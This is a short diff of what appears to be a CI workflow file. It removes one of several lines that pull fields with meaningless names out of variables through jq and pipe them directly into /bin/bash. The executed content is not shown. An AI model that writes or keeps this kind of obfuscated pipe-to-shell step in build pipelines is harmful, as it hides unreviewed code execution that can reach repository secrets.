@@ -21,7 +21,6 @@ jobs:
           echo $yc18 | jq -r .ad200 | /bin/bash
           echo $tw5 | jq -r .azh40517 | /bin/bash
           echo $um31 | jq -r .qtrwf0794 | /bin/bash
-          printf '%s' "$yexne087" | jq -r .n0105 | /bin/bash
           printf '%s' "$xs9" | jq -r .cioh931 | /bin/bash
 
       - name: Upload artifact
